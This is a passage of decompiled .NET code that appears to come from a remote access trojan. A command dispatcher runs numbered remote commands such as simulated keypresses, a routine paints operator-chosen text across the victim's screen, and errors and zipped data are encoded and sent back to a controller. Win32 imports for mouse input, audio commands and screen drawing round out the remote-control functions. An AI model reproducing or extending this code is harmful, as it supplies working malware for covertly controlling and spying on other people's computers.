					string text = API.DEB(ref s);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, s }, (string[])null, true, false);
					string Text = text;
					object[] array4 = new object[1];
					object[] array5 = array4;
					int num2 = 2;
					array5[0] = 2;
					int CLR = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					object[] array6 = new object[1];
					object[] array7 = array6;
					int num3 = 3;
					array7[0] = 3;
					int Size = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					int sec = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 4 }, (string[])null));
					DrawScreen(ref Text, ref CLR, ref Size, ref sec);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 4, sec }, (string[])null, true, false);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, Size }, (string[])null, true, false);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, CLR }, (string[])null, true, false);
					break;
				}
				case "#44":
					keyboard.click(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), (Keys)Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)));
					break;
				}
			}
			catch (Exception ex23)
			{
				ProjectData.SetProjectError(ex23, num4);
				Exception ex24 = ex23;
				bz = false;
				B.Busy = false;
				switch (Er)
				{
				case -1:
					ProjectData.ClearProjectError();
					return;
				case -2:
					ProjectData.ClearProjectError();
					return;
				default:
				{
					string s = ex24.Message;
					sdEr(ref Er, ref s);
					ProjectData.ClearProjectError();
					break;
				}
				}
			}
			bz = false;
		}
	}

	public static void DrawScreen(ref string Text, ref int CLR, ref int Size, ref int sec)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		Font val = new Font("arial", (float)Size);
		int num = Conversions.ToInteger(Conversions.ToString(sec) + Conversions.ToString(0) + Conversions.ToString(0) + Conversions.ToString(0));
		for (int i = 0; i <= num; i = checked(i + 100))
		{
			Thread.Sleep(10);
			Graphics.FromHdc((IntPtr)GetDC(0)).DrawString(Text, val, (Brush)new SolidBrush(Color.FromArgb(CLR)), 0f, 0f);
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetDC(int hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int ReleaseDC(int hWnd, int hDC);

	public static void sdEr(ref int Er, ref string T)
	{
		B b = MyProject.Forms.B;
		string T2 = "#10" + Y + "^" + Conversions.ToString(Er) + Y + API.ENB(ref T);
		b.SEND(ref T2);
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

	public static string siz(string Size)
	{
		if (Size.Length < 4)
		{
			return Size + " Bytes";
		}
		string text = Conversions.ToString(Conversions.ToDouble(Size) / 1024.0);
		string text2 = " KB";
		int num = default(int);
		if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
		{
			Array array = Strings.Split(text, ".", -1, (CompareMethod)0);
			text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null));
			num = ((NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), 1, 3)));
		}
		if (text.Length > 3)
		{
			text = Conversions.ToString(Conversions.ToDouble(text) / 1024.0);
			text2 = " MB";
			if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
			{
				Array array2 = Strings.Split(text, ".", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
				num = ((NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null)), 1, 3)));
			}
		}
		if (text.Length > 3)
		{
			text = Conversions.ToString(Conversions.ToDouble(text) / 1024.0);
			text2 = " GB";
			if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
			{
				Array array3 = Strings.Split(text, ".", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 0 }, (string[])null));
				num = ((NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)), 1, 3)));
			}
		}
		return text + "." + Conversions.ToString(num) + text2;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	public static byte[] SB(ref string s, ref byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream();
		byte[] bytes = Encoding.Default.GetBytes(s);
		memoryStream.Write(bytes, 0, bytes.Length);
		byte[] b = B;
		bool CM = true;
		byte[] array = API.ZIP(b, ref CM);
		memoryStream.Write(array, 0, array.Length);
		return memoryStream.ToArray();
	}
}
